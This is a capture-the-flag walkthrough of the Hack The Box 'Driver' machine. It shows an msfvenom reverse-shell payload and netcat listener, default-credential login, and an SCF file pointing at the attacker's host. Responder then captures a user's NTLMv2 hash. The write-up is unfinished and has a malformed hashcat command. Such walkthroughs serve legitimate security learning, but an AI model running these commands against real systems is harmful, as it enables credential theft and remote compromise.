---
title: "Driver"
author: "Me"
date: "January 03, 2022"
output: html_document
---

# Driver

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: Easy</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Windows</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_driver_desc.png){: height="300px" width = 320px"}
</div>

**Ports/services exploited:** 80/http, 445/SMB\\
**Tools:** autorecon, msfvenom, responder, hashcat\\
**Techniques:** SCF (Shell Command Files) attacks\\
**Keywords:** HP MultiFonction Printer, SMB NT LM 0.12 dialect, SCF, NTLV2, MS10-012 (NTLM Weak Nonce), MS08-068 (SMB Relay Code Execution)

**TL;DR**: The host is running a web sever with an application that requires authentication. It appears to be a "MFP Firmware Update Center", and the default credentials admin/admin grant us access to the application, where it is possible to upload files. There's also SMB running, and this latter uses a dialect (NT LM 0.12) that is vulnerable to SCF. We can then create a SCF and upload it on the server. The user browsing to the share will trigger the execution of the SCF, resulting in him/her connecting to the share specified in the SCF. The tool *responder* can be used to capture the user's password hash.

## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

Let's start this box by launching an *autorecon* scan:

````
sudo autorecon 10.10.11.105
`````

See *autorecon*'s official documentation or <a href="/_walkthroughs/Horizontall">Horizontall</a> for an explanation of the results. 
Here's the *nmap* output, performed by *autorecon*. The script took 1.5 hour to run! 

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_driver_nmap.png)
</div>

The following services are running:

- Microsoft IIS 10.0 web server on port 80
- Microsoft End Point Mapper (EPMAP), also known as MS-RPC, on port 135. It is used to remotely manage services such as DHCP server or DNS
- Microsoft-DS Active Directory (AD, Windows shares) or Microsoft-DS SMB (file sharing) on port 445
- WinRM or Wsman on port 5985, for remote management
- Something on port 7680 that could be, according to the internet, used by WUDO (Windows Update Delivery Optimization) in Windows LANs.

Also, the target OS is likely to be Microsoft Windows Server 2008 R2 at 90% or Windows 10 at 85%. It's not shown in *nmap*'s output above, but it also ran a few scripts such as *smb-os-discovery*, *smb-security-mode*, and so on. There was nothing interesting though.


## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

Let's go through each directory *autorecon* created for those services, starting with http (*cat /results/10.10.11.106/scans/tcp80/tcp_80_http_nmap.txt*).\\
*Autorecon* performed an additional targeted *nmap* scan for port 80. This latter would inform us if it found any web vulnerability such as XSS or CSRF. it's not the case here, nothing stands out. It also performed directory bruteforcing with *feroxbuster* and different wordlists, but there's nothing interesting either. 

Next, we'll browse to *10.10.11.106* to have a look at that web page:

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_driver_site.png)
</div>

By searching "MFP Firmware Update Center" on the internet, we learn that it stands for HP **MultiFonction Printer**. 
We can look at the documentation to see that the default credentials are *admin/admin*:

<div class="img_container">
![default creds]({{https://jsom1.github.io/}}/_images/htb_driver_creds.png)
</div>

So, let's see if the site uses the default credentials:

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_driver_site2.png)
</div>

And it does. Apparently, they conduct tests MFPs firmware updates and/or drivers. The only working button is *Firmware Updates* and it takes us to the following page:

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_driver_site3.png)
</div>

So, this is where we can upload a file. This latter is then supposedly being reviewed and tested.
There are 4 Printer models to chose from: *HTB DesignJet*, *HTB Ecotank*, *HTB Laserjet Pro* and HTB Mono*. It's too early to say if that matters, but it's good to have that in mind.
Also, we notice in the URLs that the site is made of PHP scripts. This can be useful to search for *.php* file extensions specifically with *gobuster*, or to generate a php reverse shell payload, for example.\\
Let's try to upload a reverse shell payload generated by *msfvenom*. In this example, we will use a stageless payload for Windows x64. Before submitting it, we start a netcat listener to catch the potential reverse connection:

````
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f exe > revsh-x64.exe
sudo nc -nlvp 4444
`````

By uploading this file onto the web server, we see in the URL *10.10.11.106/fw_up.php?msg=SUCCESS*. That means the upload was successful, however we don't receive anything on the listener... Sometimes we have to trigger the execution of the uploaded file by browsing to its location and clicking on it, but we don't know where it was uploaded. Is it uploaded on an SMB share? Because it is said that "the testing team will review the uploads manually and initiate the testing", I waited for a moment to see if it would somehow be executed by a cronjob, but it's not the case. Or maybe it is the case but it's not the right payload...\\

Well, if it is indeed upload on a SMB share, let's enumerate this service to see what we can get. Thanks to *autorecon*, everything has been done already and can be found in */results/10.10.11.106/scans/tcp445*. There's a specific SMB *nmap* scan, *enum4linux* results, and other SMB enumeration results:

<div class="img_container">
![SMB]({{https://jsom1.github.io/}}/_images/htb_driver_smb.png)
</div>

We see *nmap* ran some NSE scripts, and some of them failed. We see however that SMB uses *NT LM 0.12* (SMBv1) dialect, which appears to be dangerous. This reminds me of <a href="/_walkthroughs/Lame">Lame</a>, a Windows box in which we exploited another SMB dialect, *Samba*.\\
I know NTLM from Windows NTLM hashes, but not really in this context. From the internet, here's what I found about it:

"*NTLM (NT Lan Manager) is a challenge-response authentication protocol used by the SMB protocol. Windows systems commonly use the SMB protocol with NTLM authentication for network file/printer sharing and remote administration via DCE/RPC. Flaws in Microsoft's implementation of the NTLM challenge-response authentication protocol causing the server to generate duplicate challenges/nonces and an information leak allow an unauthenticated remote attacker without any kind of credentials to access the SMB service of the target system under the credentials of an authorized user. Depending on the privileges of the user, the attacker will be able to obtain and modify files on the target system and execute arbitrary code.*".

Well, that sounds promising and comes from <a href="https://www.exploit-db.com/exploits/15266">NTLM Weak Nonce (MS10-012)</a>. This concept seems to be used in an exploit, <a href="https://www.exploit-db.com/exploits/16360">SMB Relay Code Execution (MS08-068)</a>. A few words of its descriptions are given below:

"*This module will relay SMB authentication requests to another host, gaining access to an authenticated SMB session if successful.
If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary
payload. To exploit this, the target system	must try to	authenticate to this module. The easiest way to force a SMB authentication attempt 
is by embedding a UNC path (\\\\SERVER\\SHARE) into a web page or email message. When the victim views the web page or email, their 
system will automatically connect to the server specified in the UNC share (the IP address of the system running this module) and attempt to authenticate.

By searching *searchsploit smb relay*, we find an existing exploit. On *Metasploit*, this latter is rated excellent. However, looking at its options it seems we need to have access to the *ADMIN$* share, which we don't... As usual, I had to look for hints on the forum and it turns out we have to look at **SCF File Attacks**. I'll resume the article available <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">here</a>: 

Even if an SMB share doesn't contain anything, it could be configured with writ permissions for unauthenticated users. If this is the case, it is possible to obtain password hashes of domain users, or meterpreter shells. SCF (Shell Command Files) can be used to open a Windows explorer or other limited operations, but it can also be used to access a specific UNC path, allowing a malicious user to build an attack. For example, the SCF syntax to toggle the Desktop is the following:

````
[Shell]
Command=2
IconFile=\\X.X.X.X\share\test.ico
[Taskbar]
Command=ToggleDesktop
`````

This code has to be placed inside a text file and then uploaded into a network share. So, if the files we submit on the server are indeed uploaded in a share, then it could work! What's interesting is that saving the file as SCF will make the file to be executed when the user browses to it. In our case, there is obviously not someone who will manually review the file (even though it is said so on the server), but there's most likely a cronjob reading it.\\
Also, adding a "@" before the file name will place the file at the top of the list (@example.scf).

Then, the article says we have to use *responder* to capture the hashes of the users who will browse to that share and execute our file. I didn't know about this tool at all, but it is available on Github (<a href="https://github.com/lgandx/Responder">link</a>) where we learn that "*Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication*". Well, I don't really understand what that means but we'll use it as a black box. It turns out that *responder* is already installed on Kali. Let's look at the help page with *responder -h*. We see the usage is:

````
responder -I eth0 -w -r -f
``````

Where:

- *-I*: specifies the network interface to use, here *eth0*
- *w*: starts the WPAD rogue proxy server
- *r*: enables answers for netbios wredir suffix queries
- *-f*: allows us to fingerprint a host that issued an NBT-NS or LLMNR query

So, when the "user" will execute our SCF by browsing to the share, it will automatically connect back to the UNC path specified in the SCF file. Then, Windows will try to authenticate to that share with the user's credentials. The idea is to steal those credentials. It is possible because during the autentication process, a random 8 byte challenge key is sent from the server to the client. This key is used to encrypt the hashed NTLM/LANMAN password, and *responder* allows us to capture the NTLMv2 hash.\\
Note that we could use Metasploit's auxiliary module *auxiliary/server/capture/smb* instead of *responder*.

Enough theory, let's try it! We start by creating the SCF and naming it "@test.scf":

```
[Shell]
Command=2
IconFile=\\10.10.14.11\share\test.ico
[Taskbar]
Command=ToggleDesktop
````

Before uploading the file on the server, we start *responder*:

````
sudo responder -I tun0 -w -r -f
`````
Note that we want to listen on thee *tun0* interface, which is associated with HtB. Let's look at the results:

<div class="img_container">
![responder]({{https://jsom1.github.io/}}/_images/htb_driver_resp.png)
</div>

<div class="img_container">
![hash]({{https://jsom1.github.io/}}/_images/htb_driver_hash.png)
</div>

It worked! We see the user *tony* authenticated and *responder* captured the NTLMv2 hash. In the article, it is then said that this technique can be combined with SMB relay (we saw an exploit earlier) to get meterpreter reverse shells. Before doing so however, let's just try to crack the hash. If we manage to do so, we might also be able to use *evil-winrm* since we saw port 5985 is open (I used it in <a href="/_walkthroughs/Atom">Atom</a>, where there's more information about it).

hashcat -m tony.hash /usr/share/wordlists/rockyou.txt --force


win-rm syntax:

````
evil-winrm -u username -p 'password' -i targetip
`````


## 3. Vertical privilege escalation
{:style="color:DarkRed; font-size: 170%;"}


<div class="img_container">
![pwn]({{https://jsom1.github.io/}}/_images/htb_driver_pwn.png){: height="380px" width = 390px"}
</div>


<ins>**My thoughts**</ins>

Original box
Interesting to see that printers can present a security risk if not properly secured or updated.
2nd time I use autorecon, looks great but ton of information - easy to get lost. 

<ins>**Fix the vulnerabilities**</ins>


